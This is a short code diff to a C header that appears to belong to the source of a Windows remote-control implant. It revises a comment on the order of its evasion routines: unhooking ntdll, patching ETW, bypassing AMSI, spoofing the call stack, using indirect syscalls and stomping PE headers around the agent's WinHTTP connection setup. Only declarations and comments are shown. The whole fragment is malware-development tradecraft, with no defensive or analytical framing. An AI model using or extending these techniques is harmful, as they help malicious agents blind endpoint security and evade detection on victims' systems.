@@ -158,12 +158,13 @@ BOOL evasion_stomp_pe_headers(void);
 /*
  * Split evasion init — use these in agent_init() around channel_init_active():
  *
- *   evasion_init_pre_connect()   — anti-analysis + stack spoof
- *   channel_init_active()        — WinHttpOpen (needs clean ETW/ntdll)
- *   evasion_init_post_connect()  — unhook ntdll + ETW + AMSI + syscalls + PE stomp
+ *   evasion_init_pre_connect()   — anti-analysis + unhook ntdll + ETW + AMSI + stack spoof
+ *   channel_init_active()        — WinHttpOpen
+ *   evasion_init_post_connect()  — indirect syscalls + PE stomp
  *
- * WinHTTP uses ETW internally during WinHttpOpen; patching ETW or
- * unhooking ntdll before that call breaks the HTTP session.
+ * WinHTTP registers ETW providers during WinHttpOpen. Patching ETW
+ * AFTER that call leaves dangling provider state → WinHttpSendRequest
+ * deadlocks. Unhook/ETW/AMSI MUST run BEFORE WinHttpOpen.
  */
 BOOL evasion_init_pre_connect(void);
 BOOL evasion_init_post_connect(void);
